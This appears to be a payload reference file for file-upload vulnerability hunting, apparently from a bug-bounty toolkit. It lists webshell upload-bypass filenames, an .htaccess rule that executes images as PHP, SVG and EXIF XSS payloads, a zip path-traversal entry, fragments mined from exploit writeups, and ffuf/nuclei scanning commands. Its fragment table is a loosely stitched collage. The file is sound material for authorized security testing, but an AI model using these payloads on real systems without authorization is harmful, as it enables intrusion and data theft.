# Payloads — File Upload and File-Handling Flaws

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# File Upload — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `shell.php.jpg` `shell.pHp` `shell.php%00.jpg` `shell.svg`

- `.htaccess` -> `AddType application/x-httpd-php .jpg`

- SVG -> `<svg onload=alert(1)>`

- Zip -> `../../../../var/www/shell.php`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 3× | `cr_in_resume_from()` |

| 3× | `ctx->read_cb` |

| 3× | `cr_in_needs_rewind()` |

| 3× | `http_resume()` |

| 2× | `ctx->has_used_cb` |

| 2× | `ctx->has_used_cb = TRUE` |

| 2× | `curl_multi_remove_handle() returned 8 / API function called from within callback / No ASAN crash` |

| 1× | `https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}` |

| 1× | `PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}` |

| 1× | `val image = PicfitImage( / id = ImageId(s"$rel:${ThreadLocalRandom.nextString(8)}.$extension"), / // rel parameter used directly without val` |

| 1× | `curl -X POST "https://lichess.org/upload/image/user/test:evil:format:break" \ / -b "lila2=YOUR_SESSION_COOKIE" \ / -H "Origin: https://liche` |

| 1× | `/upload/image/user/{rel}` |

| 1× | `{rel}:{random12}:{random8}.{extension}` |

| 1× | `$ne` |

| 1× | `exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png` |

| 1× | `█████████@` |

| 1× | `<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">` |

| 1× | `.html()` |

| 1× | `SV_AddResource (t_eventscript, filename, FS_FileSize (filename), RES_FATALIFMISSING, 0);` |

| 1× | `alert(XSS)` |



## Parameters observed



`mode` · `getsc` · `page` · `imgnum` · `fwa` · `AWSAccessKeyId` · `Expires` · `Signature` · `url` · `action` · `path` · `_hxcategory` · `cmd` · `fileToUpload` · `subject` · `report_id` · `file` · `can` · `start` · `num`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_file-upload.txt` | 65 |

| `~/.local/share/hackerone-reports/wordlists/params_file-upload.txt` | 25 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_file-upload.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_file-upload.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Test extension/MIME/polyglot bypasses manually; scan for known upload CVEs on the detected stack.



```sh

nuclei -u https://target -tags file-upload \

       -severity low,medium,high,critical -rl 40 -o nuclei_file-upload.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_file-upload_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
